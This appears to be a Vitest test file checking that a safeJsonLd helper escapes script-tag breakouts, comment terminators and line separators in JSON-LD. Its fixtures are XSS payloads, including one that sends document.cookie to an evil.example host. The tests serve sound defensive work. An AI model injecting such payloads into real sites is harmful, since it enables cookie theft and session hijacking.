import { describe, it, expect } from "vitest"

import { safeJsonLd } from "../json-ld"

describe("safeJsonLd", () => {
  it("escapes </script> attack vector inside string fields", () => {
    const out = safeJsonLd({ about: "</script><script>window.__pwned=true</script>" })
    // The literal closing-script bytes must NOT survive — that is the
    // whole point of the helper.
    expect(out).not.toContain("</script>")
    // The opening `<` of </script and <script must be escaped to <.
    expect(out).toContain("\\u003c/script")
    expect(out).toContain("\\u003cscript")
  })

  it("escapes raw `</` regardless of tag name", () => {
    const out = safeJsonLd({ html: "<a></a><iframe></iframe>" })
    // Every < followed by anything must become <
    expect(out.match(/</g)).toBeNull()
    expect(out).toContain("\\u003c")
  })

  it("escapes HTML comment terminator `-->`", () => {
    const out = safeJsonLd({ comment: "<!-- inside --> outside" })
    expect(out).not.toContain("-->")
    expect(out).toContain("--\\u003e")
  })

  it("escapes U+2028 LINE SEPARATOR", () => {
    const payload = { text: `line1${" "}line2` }
    const out = safeJsonLd(payload)
    expect(out).not.toContain(" ")
    expect(out).toContain("\\u2028")
  })

  it("escapes U+2029 PARAGRAPH SEPARATOR", () => {
    const payload = { text: `para1${" "}para2` }
    const out = safeJsonLd(payload)
    expect(out).not.toContain(" ")
    expect(out).toContain("\\u2029")
  })

  it("preserves a roundtrip — JSON.parse recovers the original payload", () => {
    const payload = {
      "@context": "https://schema.org",
      "@type": "Person",
      name: "Bob",
      about: "Hello <strong>world</strong>",
      malicious: "</script><script>alert(1)</script>",
      separators: `a${" "}b${" "}c`,
      comment: "<!-- nope --> oops",
      nested: { inner: "</body>" },
      list: ["</script>", "ok"],
    }
    const serialized = safeJsonLd(payload)
    expect(JSON.parse(serialized)).toEqual(payload)
  })

  it("handles non-object payloads (string, number, null, array)", () => {
    expect(JSON.parse(safeJsonLd("plain"))).toBe("plain")
    expect(JSON.parse(safeJsonLd(42))).toBe(42)
    expect(JSON.parse(safeJsonLd(null))).toBe(null)
    expect(JSON.parse(safeJsonLd([1, 2, "</script>"]))).toEqual([1, 2, "</script>"])
  })

  it("returns valid JSON when stringification yields undefined (no payload to escape)", () => {
    // JSON.stringify(undefined) is undefined — replace methods fail.
    // Confirm we surface this case rather than silently producing bad HTML.
    expect(() => safeJsonLd(undefined)).toThrow()
  })

  it("a real-world Person profile with hostile `description` is fully neutralized", () => {
    const profile = {
      "@context": "https://schema.org",
      "@type": "Person",
      name: "Attacker",
      description:
        "</script><script>fetch('https://evil.example/' + document.cookie)</script>",
    }
    const out = safeJsonLd(profile)
    // No literal closing-script bytes. No literal opening-script bytes.
    expect(out).not.toMatch(/<\/script/i)
    expect(out).not.toMatch(/<script/i)
    // Still parses back identically.
    expect(JSON.parse(out)).toEqual(profile)
  })
})
